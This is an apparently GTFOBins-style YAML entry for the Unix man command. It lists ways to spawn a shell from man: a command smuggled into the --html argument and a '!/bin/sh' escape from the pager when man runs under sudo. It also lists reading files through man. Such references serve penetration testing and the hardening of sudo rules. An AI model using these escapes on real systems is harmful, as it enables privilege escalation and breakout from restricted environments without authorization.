---
description: This invokes the default pager, which is likely to be  [`less`](/gtfobins/less/), other functions may apply.
functions:
  shell:
    - code: |
        man --html='$(sh > /dev/tty)' sh
  file-read:
    - code: man file_to_read
  sudo:
    - code: |
        sudo man man
        !/bin/sh
---
